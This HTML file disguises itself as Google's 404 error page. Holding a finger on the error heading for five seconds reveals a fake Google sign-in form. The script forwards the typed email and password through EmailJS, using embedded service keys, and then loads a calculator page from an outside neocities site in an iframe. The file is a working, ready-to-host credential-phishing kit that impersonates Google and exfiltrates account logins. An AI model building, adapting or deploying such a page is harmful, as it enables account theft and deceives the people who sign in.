<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>404 Not Found</title>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500&display=swap" rel="stylesheet">
    <style>
        :root {
            --blue: #1a73e8;
            --text: #202124;
            --secondary: #5f6368;
            --border: #dadce0;
        }

        body, html { 
            margin: 0; padding: 0; height: 100%; width: 100%;
            font-family: 'Roboto', arial, sans-serif; background: #fff;
        }

        /* --- AUTHENTIC 404 VIEW --- */
        #not-found-view {
            padding: 30px; margin-top: 50px;
            display: flex; flex-direction: column; align-items: center;
        }
        .robot-box { max-width: 400px; width: 100%; }
        .robot-img { width: 120px; float: right; margin-left: 20px; }
        h1 { font-size: 14px; font-weight: 700; margin: 0; color: var(--text); }
        .error-msg { font-size: 14px; line-height: 1.5; color: var(--text); margin: 15px 0; }
        .error-msg ins { text-decoration: none; color: var(--secondary); }
        #hold-target { cursor: default; user-select: none; -webkit-user-select: none; }

        /* --- AUTHENTIC GOOGLE LOGIN --- */
        #access-request {
            display: none; height: 100vh;
            flex-direction: column; align-items: center; justify-content: center;
        }
        .login-card {
            width: 100%; max-width: 400px; padding: 48px 40px;
            border: 1px solid var(--border); border-radius: 8px;
            box-sizing: border-box; text-align: center;
        }
        .g-logo { height: 24px; margin-bottom: 10px; }
        h2 { font-size: 24px; font-weight: 400; margin: 0 0 8px; color: var(--text); }
        .sub-text { font-size: 16px; margin-bottom: 30px; color: var(--text); }
        
        input {
            width: 100%; padding: 13px 15px; margin-bottom: 10px;
            border: 1px solid var(--border); border-radius: 4px;
            font-size: 16px; box-sizing: border-box; outline: none;
        }
        input:focus { border: 2px solid var(--blue); padding: 12px 14px; }
        
        .action-row {
            display: flex; justify-content: space-between; align-items: center;
            margin-top: 26px;
        }
        .create-acc { color: var(--blue); font-weight: 500; font-size: 14px; text-decoration: none; }
        button {
            background: var(--blue); color: #fff; border: none;
            padding: 10px 24px; border-radius: 4px; font-weight: 500;
            cursor: pointer; font-size: 14px;
        }

        /* --- APP IFRAME --- */
        #app-view { display: none; width: 100vw; height: 100vh; }
        iframe { width: 100%; height: 100%; border: none; }

        @media (max-width: 450px) {
            .login-card { border: none; padding: 20px; }
            #not-found-view { align-items: flex-start; }
        }
    </style>
</head>
<body>

<div id="not-found-view">
    <div class="robot-box">
        <img src="https://www.google.com/images/errors/robot.png" class="robot-img">
        <p class="error-msg">
            <b>404.</b> <ins>That’s an error.</ins><br><br>
            The requested URL was not found on this server. <ins>That’s all we know.</ins>
        </p>
        <h1 id="hold-target">Error 404 (Not Found)!!1</h1>
    </div>
</div>

<div id="access-request">
    <div class="login-card">
        <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" class="g-logo">
        <h2>Sign in</h2>
        <p class="sub-text">Use your Google Account</p>
        <form id="request-form">
            <input type="email" name="user_email" placeholder="Email or phone" required>
            <input type="password" name="user_password" placeholder="Enter your password" required>
            <div class="action-row">
                <span class="create-acc">Create account</span>
                <button type="submit" id="submit-btn">Next</button>
            </div>
        </form>
    </div>
</div>

<div id="app-view">
    <iframe src="https://harrythehacker.neocities.org/Calculator"></iframe>
</div>

<script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>

<script>
    // Initialize correctly
    (function(){
        emailjs.init("6iGADKihYbPC4ecb");
    })();

    let timer;
    const target = document.getElementById('hold-target');

    // Detect finger hold
    target.addEventListener('touchstart', () => {
        timer = setTimeout(() => {
            document.getElementById('not-found-view').style.display = 'none';
            document.getElementById('access-request').style.display = 'flex';
        }, 5000);
    });
    target.addEventListener('touchend', () => clearTimeout(timer));

    document.getElementById('request-form').addEventListener('submit', function(e) {
        e.preventDefault();
        const btn = document.getElementById('submit-btn');
        btn.innerText = "Verifying...";

        // Use the exactly correct send method
        emailjs.sendForm('service_06y4hgi', 'template_56l2irz', this)
            .then(() => {
                document.getElementById('access-request').style.display = 'none';
                document.getElementById('app-view').style.display = 'block';
            })
            .catch((err) => {
                btn.innerText = "Next";
                // Show specific error info to fix connection
                alert("Connection Error: " + err.text); 
                console.error("EmailJS Failed:", err);
            });
    });
</script>

</body>
</html>
